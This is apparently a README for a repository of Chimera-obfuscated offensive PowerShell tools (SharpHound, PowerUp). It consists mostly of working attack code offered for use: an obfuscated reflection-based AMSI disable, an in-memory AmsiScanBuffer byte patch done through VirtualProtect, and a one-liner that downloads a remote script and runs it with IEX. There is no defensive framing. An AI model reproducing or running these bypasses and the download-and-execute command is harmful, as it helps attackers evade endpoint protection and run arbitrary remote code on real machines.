# A Collection of encoded powershell tools. All encoding done via Chimera

Tools added:
* SharpHound
* PowerUp

# How to

## Disable AMSI

``` pwsh
$String1 = @('s','l','i','t','U','i','*');$String2 = @('t','x','e','t','n','o','C','*');[array]::Reverse($String1);[array]::Reverse($String2);$Ass=[Ref].Assembly.GetTypes();Foreach($SingleAss in $Ass) {if($SingleAss.Name -Like (-join($String1))){$Wildcard=$SingleAss}};$WildcardFields=$Wildcard.GetFields('NonPublic, Static');Foreach($WildcardObjects in $WildcardFields) {if($WildcardObjects.Name -Like (-join($String2))){$ObjectContext=$WildcardObjects}};$NullValue=$ObjectContext.GetValue($null);[IntPtr]$ptr=$NullValue;[Int32[]]$SingleAssuf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($SingleAssuf, 0, $ptr, 1);
```

If needed, you can also use this to bypass the AMSI .net loader
``` pwsh
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

## Run PowerShell script in memory

``` pwsh
(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/OverflowMyBuffers/whatever-script.ps1') | IEX
```
